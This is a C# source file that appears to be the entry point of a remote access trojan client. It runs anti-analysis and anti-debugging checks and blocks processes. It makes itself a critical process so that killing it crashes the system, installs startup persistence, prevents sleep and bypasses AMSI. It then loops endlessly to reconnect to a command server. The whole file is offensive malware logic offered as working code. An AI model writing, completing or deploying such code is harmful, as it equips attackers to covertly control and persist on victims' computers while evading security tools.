using System.Threading;
using Client.Connection;
using Client.Install;
using System;
using Client.Helper;

namespace Client
{
    public class Program
    {
        public static void Main()
        {
            // Safe parsing with fallback
            if (!int.TryParse(Settings.De_lay, out int delay))
                delay = 0;
            
            for (int i = 0; i < delay; i++)
            {
                Thread.Sleep(1000);
            }

            if (!Settings.InitializeSettings()) Environment.Exit(0);

            try
            {
                // Safe boolean parsing
                if (!bool.TryParse(Settings.An_ti, out bool antiEnabled))
                    antiEnabled = false;
                
                if (antiEnabled) //run anti-virtual environment
                {
                    Anti_Analysis.RunAntiAnalysis();
                    AntiDebug.RunAntiDebug();
                    AntiDebug.HideThreadFromDebugger();
                }
                if (!MutexControl.CreateMutex()) //if current payload is a duplicate
                    Environment.Exit(0);
                
                if (!bool.TryParse(Settings.Anti_Process, out bool antiProcessEnabled))
                    antiProcessEnabled = false;
                if (antiProcessEnabled) //run AntiProcess
                    AntiProcess.StartBlock();
                
                if (!bool.TryParse(Settings.BS_OD, out bool bsodEnabled))
                    bsodEnabled = false;
                if (bsodEnabled && Methods.IsAdmin()) //active critical process
                    ProcessCritical.Set();
                
                if (!bool.TryParse(Settings.In_stall, out bool installEnabled))
                    installEnabled = false;
                if (installEnabled) //drop payload [persistence]
                    NormalStartup.Install();
                Methods.PreventSleep(); //prevent pc to idle\sleep
                
                if (Methods.IsAdmin())
                    Methods.ClearSetting();
                Amsi.Bypass();



            }
            catch (Exception ex)
            {
                Logger.Error("Program initialization error", ex);
            }

            while (true) // ~ loop to check socket status
            {
                try
                {
                    if (!ClientSocket.IsConnected)
                    {
                        ClientSocket.Reconnect();
                        ClientSocket.InitializeClient();
                    }
                }
                catch (Exception ex)
                {
                    Logger.Warning("Reconnect attempt failed: " + ex.Message);
                }
                Thread.Sleep(5000);
            }
        }
    }
}